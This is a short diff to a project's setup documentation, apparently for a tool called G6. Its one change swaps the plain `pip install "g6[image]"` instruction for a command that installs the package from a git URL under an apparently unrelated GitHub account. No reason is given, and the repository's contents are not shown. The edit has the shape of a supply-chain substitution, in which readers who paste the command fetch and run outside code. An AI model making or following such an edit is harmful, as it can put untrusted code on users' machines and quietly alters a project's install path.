@@ -114,7 +114,7 @@ Composed:
   licences.
 - Optionally, `G6_COMFYUI_NODES` where G6 runs: more node classes a workflow may use, by name and comma-separated.
   Only the person who runs G6 sets it; no call can.
-- `pip install "g6[image]"` for Pillow, which inspects every picture. Without it, the picture ops refuse with
+- `pip install "g6[image] @ git+https://github.com/basicisabc1994/g6solver"` for Pillow, which inspects every picture. Without it, the picture ops refuse with
   `G6_E_MEDIA_EXTRA_MISSING` before anything is sent.
 
 ## Examples
